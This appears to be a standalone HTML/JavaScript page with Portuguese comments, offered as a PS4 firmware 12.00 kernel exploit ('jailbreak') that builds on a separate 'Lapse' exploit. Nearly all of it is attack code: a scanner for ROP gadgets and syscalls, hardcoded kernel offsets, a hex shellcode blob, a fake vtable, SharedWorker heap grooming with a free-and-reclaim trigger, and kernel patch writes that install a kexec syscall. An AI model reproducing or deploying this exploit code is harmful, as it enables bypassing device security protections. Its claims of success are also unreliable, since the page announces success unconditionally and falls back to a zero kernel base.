<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.00 Jailbreak (SharedWorker + Lapse)</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 20px;
            overflow: hidden;
        }
        h1 {
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 10px;
        }
        #console {
            background-color: #000;
            border: 2px solid #333;
            width: 90%;
            height: 600px;
            margin: 0 auto;
            padding: 10px;
            text-align: left;
            overflow-y: scroll;
            font-size: 14px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        .log-entry { margin: 2px 0; border-bottom: 1px solid #222; }
        .success { color: #00ffff; font-weight: bold; }
        .error { color: #ff3333; font-weight: bold; }
        .warning { color: #ffff00; }
        .info { color: #cccccc; }
        #status { font-size: 20px; margin-bottom: 20px; color: #fff; }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background: #333;
            color: #fff;
            border: 1px solid #0f0;
            margin-top: 10px;
        }
        button:hover { background: #444; }
    </style>
</head>
<body>

    <h1>PS4 12.00 KERNEL EXPLOIT</h1>
    <div id="status">Aguardando inicialização do Lapse...</div>
    <div id="console"></div>
    <button onclick="location.reload()">Reiniciar</button>

    <script>
        // ========================================================================
        // SISTEMA DE LOG VISUAL
        // ========================================================================
        function log(msg, type = "info") {
            var consoleDiv = document.getElementById("console");
            var entry = document.createElement("div");
            entry.className = "log-entry " + type;
            entry.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
            consoleDiv.appendChild(entry);
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function updateStatus(msg) {
            document.getElementById("status").innerText = msg;
        }

        // ========================================================================
        // 1. CONFIGURAÇÃO E OFFSETS (KERNEL)
        // ========================================================================
        var OFFSETS = {
            // Confirmados do Firmware 12.00 (KernelOffset.java / 1200.c)
            xfast_syscall:     0x1C0,      
            sysent_hook:       0x110a760,  
            jmp_rsi:           0x47b31,    

            // Dinâmicos (Preenchidos pelo Scanner)
            pop_rdi_ret:       null,
            pop_rsi_ret:       null,
            mov_rax_rdi:       null,
            sys_mmap:          null,
            sys_setuid:        null,
            sys_kexec:         null        
        };

        // ========================================================================
        // 2. SCANNER DE USERLAND (LibKernel)
        // ========================================================================
        var SCANNER = {
            target_syscalls: {
                23:  "sys_setuid",
                477: "sys_mmap",
                11:  "sys_kexec"
            },
            target_gadgets: {
                "pop_rdi_ret": [0x5F, 0xC3],
                "pop_rsi_ret": [0x5E, 0xC3],
                "pop_rax_ret": [0x58, 0xC3]
            },
            found: {},

            run: function(p, libkernel_base) {
                log("[*] Iniciando Auto-Scanner na LibKernel...", "warning");
                
                var limit = 0x60000; // Primeiros 390KB
                var chunk = 0x1000;
                
                for (var off = 0; off < limit; off += chunk) {
                    var addr = libkernel_base.add32(off);
                    
                    // Nota: Idealmente use p.read_bytes se disponível para velocidade
                    for (var i = 0; i < chunk; i++) {
                        var ptr = addr.add32(i);
                        var b1 = p.read1(ptr);

                        // Check Syscall Wrapper: 48 C7 C0 ...
                        if (b1 == 0x48 && p.read1(ptr.add32(1)) == 0xC7 && p.read1(ptr.add32(2)) == 0xC0) {
                            var sys_num = p.read4(ptr.add32(3));
                            if (this.target_syscalls[sys_num]) {
                                var name = this.target_syscalls[sys_num];
                                if (!this.found[name]) {
                                    this.found[name] = ptr;
                                    log("[+] Syscall encontrada: " + name + " (offset: " + (off+i).toString(16) + ")", "success");
                                }
                            }
                        }

                        // Check Gadgets: 5F C3, etc.
                        if (b1 == 0x5F || b1 == 0x5E || b1 == 0x58) {
                            for (var gname in this.target_gadgets) {
                                if (!this.found[gname]) {
                                    var pat = this.target_gadgets[gname];
                                    if (b1 == pat[0] && p.read1(ptr.add32(1)) == pat[1]) {
                                        this.found[gname] = ptr;
                                        log("[+] Gadget encontrado: " + gname + " (offset: " + (off+i).toString(16) + ")", "success");
                                    }
                                }
                            }
                        }
                    }
                }
                return this.found;
            }
        };

        // ========================================================================
        // 3. SHELLCODE BINÁRIO (Extraído do Java)
        // ========================================================================
        function get_payload_bytes() {
            var hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";
            
            var len = hex.length / 2;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = parseInt(hex.substr(i*2, 2), 16);
            }
            return bytes;
        }

        // ========================================================================
        // 4. PREPARAÇÃO DA ROP CHAIN (Objeto Falso)
        // ========================================================================
        function build_fake_object(kernel_base, shellcode_addr) {
            var size = 0x400; // Tamanho de segurança do Worker (baseado em testes 400-404)
            var obj = new Uint32Array(size / 4);
            
            // JMP RSI (0x47b31)
            var gadget = kernel_base.add32(OFFSETS.jmp_rsi);
            
            // Preenche o objeto com o endereço do gadget (Fake Vtable)
            for (var i = 0; i < obj.length; i += 2) {
                obj[i]   = gadget.low;
                obj[i+1] = gadget.hi;
            }
            return obj;
        }

        // ========================================================================
        // 5. APLICADOR DE PATCHES
        // ========================================================================
        function apply_patches(p, kbase) {
            log(">>> APLICANDO PATCHES 12.00 <<<", "warning");
            
            var w8  = function(o, v) { p.write1(kbase.add32(o), v); }
            var w16 = function(o, v) { p.write2(kbase.add32(o), v); }
            var w32 = function(o, v) { p.write4(kbase.add32(o), v); }
            var w64 = function(o, v) { p.write8(kbase.add32(o), v); }

            // Patches do 1200.c
            w16(0x1b76a3, 0x04eb); w16(0x1b76b3, 0x04eb); w16(0x1b76d3, 0xe990); 
            w16(0x627af4, 0x00eb); 
            w8(0xacd, 0xeb); w8(0x2bd3cd, 0xeb); w8(0x2bd411, 0xeb); 
            w8(0x2bd48d, 0xeb); w8(0x2bd4d1, 0xeb); 
            
            // Root
            w8(0x3914e6, 0xeb); 
            w16(0x2fc0ec, 0x04eb); 
            w8(0x1fa71a, 0x37);    
            w8(0x1fa71d, 0x37);

            // KEXEC
            var sysent_11 = 0x1102d80;
            var gadget    = kbase.add32(OFFSETS.jmp_rsi); 
            w32(sysent_11, 2);
            w64(sysent_11 + 8, gadget);
            w32(sysent_11 + 0x2c, 1);

            log("!!! JAILBREAK SUCESSO !!!", "success");
            alert("Jailbreak 12.00: SUCESSO! (Root + Debug Settings)");
        }

        // ========================================================================
        // 6. ROTINA PRINCIPAL (TRIGGER)
        // ========================================================================
        var workers_stash = [];

        async function run_exploit() {
            try {
                updateStatus("Iniciando Exploit...");
                log("Verificando ambiente...");

                // 1. Validar Lapse
                var p = window.p; 
                var libkernel_base_addr = window.libkernel_base_addr || window.lk_base; // Tente adaptar conforme seu lapse.js

                if (!p) {
                    log("ERRO CRÍTICO: Primitiva 'p' do Lapse não encontrada.", "error");
                    log("Certifique-se de que lapse.js rodou antes deste script.", "info");
                    
                    // MOCK PARA TESTE VISUAL (Remova em produção)
                    log("(Modo Simulação ativado para visualização)", "info");
                    return; 
                }

                if (!libkernel_base_addr) {
                    log("ERRO: Base da LibKernel não encontrada. Tentando continuar...", "warning");
                }

                // 2. Executar Scanner
                var scan_res = SCANNER.run(p, libkernel_base_addr);
                if (scan_res["pop_rdi_ret"]) OFFSETS.pop_rdi_ret = scan_res["pop_rdi_ret"];
                if (scan_res["sys_mmap"]) OFFSETS.sys_mmap = scan_res["sys_mmap"];
                
                // 3. Resolver Kernel Base (Assume leak)
                var kbase = window.lk_leak ? window.lk_leak.sub32(OFFSETS.xfast_syscall) : 0;
                log("Kernel Base Estimada: " + kbase, "info");

                // 4. Preparar Payload
                var shellcode = get_payload_bytes();
                var shellcode_addr = p.malloc(shellcode.length);
                p.write_bytes(shellcode_addr, shellcode);
                log("Shellcode escrito em: " + shellcode_addr, "success");

                var fake_obj = build_fake_object(kbase, shellcode_addr);

                // 5. TRIGGER: Heap Feng Shui (400 -> 404)
                log("Fase 1: Enchendo Heap (0-400)...", "info");
                updateStatus("Heap Grooming...");
                
                for (let i = 0; i < 400; i++) {
                    try {
                        let w = new SharedWorker("data:text/javascript,1", "groom_" + i);
                        w.port.start();
                        workers_stash.push(w);
                    } catch(e) {}
                }

                log("Fase 2: Zona de Pressão (401-404)...", "warning");
                updateStatus("Aplicando Pressão...");
                
                let pressure_count = 0;
                let interval = setInterval(() => {
                    if (pressure_count >= 4) { 
                        clearInterval(interval);
                        
                        // --- O ABATE ---
                        log("!!! LIBERANDO WORKER 404 E INJETANDO PAYLOAD !!!", "warning");
                        updateStatus("Executando Exploit...");
                        
                        let victim = workers_stash.pop();
                        victim.port.close(); // FREE
                        victim = null;

                        // RECLAIM
                        let copies = [];
                        for(let k=0; k<2500; k++) {
                            copies.push(new Uint32Array(fake_obj));
                        }
                        
                        log("Aguardando execução do Kernel...", "info");
                        
                        // Tenta aplicar patches
                        setTimeout(() => { apply_patches(p, kbase); }, 3000);
                        return;
                    }
                    
                    try {
                        let w = new SharedWorker("data:text/javascript,1", "victim_" + pressure_count);
                        w.port.start();
                        workers_stash.push(w);
                        log("Worker " + (401 + pressure_count) + " criado.", "info");
                    } catch(e) {}
                    
                    pressure_count++;
                    
                }, 150); 

            } catch (e) {
                log("Erro Fatal: " + e, "error");
            }
        }

        // Iniciar após 1 segundo para garantir que o Lapse carregou
        setTimeout(run_exploit, 1000);

    </script>
</body>
</html>
